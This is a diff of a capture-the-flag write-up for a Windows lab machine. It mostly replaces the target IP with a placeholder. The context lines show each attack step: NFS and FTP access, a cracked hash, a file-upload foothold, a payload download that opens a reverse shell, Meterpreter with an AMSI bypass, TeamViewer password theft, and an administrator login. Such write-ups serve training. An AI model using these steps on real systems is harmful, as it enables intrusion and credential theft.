@@ -63,7 +63,7 @@ Looking at the FTP Share:
 ```bash
 ftp <target's ip>                                                   
 220 Microsoft FTP Service
-Name (10.129.230.172:lilith): anonymous
+Name (<target's ip>:lilith): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password: 
 230 User logged in.
@@ -94,12 +94,12 @@ Hostname/Domain Name: Remote
 NFS Share provides us interesting folder, accessed by `everyone`
 ```bash
 showmount -e <target's ip>                                          
-Export list for 10.129.230.172:
+Export list for <target's ip>:
 /site_backups (everyone)
 ```
 Mounting folder && Discovering its content
 ```bash
- sudo mount -t nfs -o nolock 10.129.230.172:/site_backups /mnt/nfs/remote 
+ sudo mount -t nfs -o nolock <target's ip>:/site_backups /mnt/nfs/remote 
 ```
 ```bash                                                                                      ls -la /mnt/nfs/remote        
 drwx------ nobody nobody 4.0 KB Sun Feb 23 20:35:48 2020 .
@@ -130,7 +130,7 @@ Dummy website, but it gives is 5 names, which could be used in the potential bru
 
 Discovering / Fuzzing Umbraco CMS
 ```bash
-ffuf -w ~/Documents/Seclists/Discovery/Web-Content/common.txt -u http://10.129.230.172/FUZZ  
+ffuf -w ~/Documents/Seclists/Discovery/Web-Content/common.txt -u http://<target's ip>/FUZZ  
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -143,7 +143,7 @@ ffuf -w ~/Documents/Seclists/Discovery/Web-Content/common.txt -u http://10.129.2
 ________________________________________________
 
  :: Method           : GET
- :: URL              : http://10.129.230.172/FUZZ
+ :: URL              : http://<target's ip>/FUZZ
  :: Wordlist         : FUZZ: /home/lilith/Documents/Seclists/Discovery/Web-Content/common.txt
  :: Follow redirects : false
  :: Calibration      : false
@@ -216,7 +216,8 @@ b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
 ![](<../assets/img/Remote/Pasted image 20260801224226.png>)
 
 ![](<../assets/img/Remote/Pasted image 20260801224348.png>)
-Admin Dashboard gives only another credentials and ability to change password. Nonetheless, `ssmith` doesn't brings us any new features or details.
+
+The Admin Dashboard only gives us another set of credentials and the ability to change the password. Nonetheless, ssmith doesn't bring us any new features or details.
 
 **BUT!** It also gives us file upload page, which could be used for uploading any malicious payload.
 ![](<../assets/img/Remote/Pasted image 20260803184949.png>)
@@ -259,7 +260,7 @@ Catching the packets:
 sudo tcpdump -i  tun0 -v icmp                                          
 tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 23:09:34.875186 IP (tos 0x0, ttl 127, id 61844, offset 0, flags [none], proto ICMP (1), length 60)
-    10.129.230.172 > arch: ICMP echo request, id 1, seq 1, length 40
+    <target's ip> > arch: ICMP echo request, id 1, seq 1, length 40
 23:09:34.875204 IP (tos 0x0, ttl 64, id 33331, offset 0, flags [none], proto ICMP (1), length 60)
 ```
 ---
@@ -404,13 +405,13 @@ Sever Receives `GET` request - the victim downloads and executes the file
 ```bash
 python3 -m http.server 9001                                            
 Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
-10.129.230.172 - - [01/Aug/2026 23:33:17] "GET /powershell.ps1 HTTP/1.1" 200 -
+<target's ip> - - [01/Aug/2026 23:33:17] "GET /powershell.ps1 HTTP/1.1" 200 -
 ```
 **We are in!** Netcat receives connection.
 ```bash
 nc -nlvp 4444                                                          
 Listening on 0.0.0.0 4444
-Connection received on 10.129.230.172 49691
+Connection received on <target's ip> 49691
 Windows PowerShell running as user REMOTE$ on REMOTE
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
@@ -460,8 +461,8 @@ Start
 ```
 [*] <target's ip> web_delivery - Delivering AMSI Bypass (1400 bytes)
 [*] <target's ip> web_delivery - Delivering Payload (3690 bytes)
-[*] Sending stage (248902 bytes) to 10.129.230.172
-[*] Meterpreter session 1 opened (10.10.14.240:7777 -> 10.129.230.172:49744) at 2026-08-02 11:26:27 +0300```
+[*] Sending stage (248902 bytes) to <target's ip>
+[*] Meterpreter session 1 opened (10.10.14.240:7777 -> <target's ip>:49744) at 2026-08-02 11:26:27 +0300```
 ```
 Metasploit opens session and just wait our interaction
 `session -i <id>` - for choosing session
@@ -616,20 +617,20 @@ run
 
 [*] Finding TeamViewer Passwords on REMOTE
 [+] Found Unattended Password: !R3m0te!
-[+] Passwords stored in: /home/lilith/.msf4/loot/20260802113142_default_10.129.230.172_host.teamviewer__562431.txt
+[+] Passwords stored in: /home/lilith/.msf4/loot/20260802113142_default_<target's ip>_host.teamviewer__562431.txt
 [*] <---------------- | Using Window Technique | ---------------->
 [*] TeamViewer's language setting options are ''
 ```
 We got the password - `!R3m0te!`
 ```bash
-evil-winrm-py -i 10.129.230.172 -u Administrator -p '!R3m0te!'                                                    
+evil-winrm-py -i <target's ip> -u Administrator -p '!R3m0te!'                                                    
           _ _            _                             
   _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
  / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
  \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                             |_|   |__/  v1.6.0
 
-[*] Connecting to '10.129.230.172:5985' as 'Administrator'
+[*] Connecting to '<target's ip>:5985' as 'Administrator'
 evil-winrm-py PS C:\Users\Administrator\Documents> whoami
 remote\administrator
 ```
@@ -699,7 +700,7 @@ PS C:\windows\system32\inetsrv> sc.exe start UsoSvc
 ```bash
 nc -nlvp 4444                                                          
 Listening on 0.0.0.0 4444
-Connection received on 10.129.230.172 49766
+Connection received on <target's ip> 49766
 Windows PowerShell running as user REMOTE$ on REMOTE
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 ```
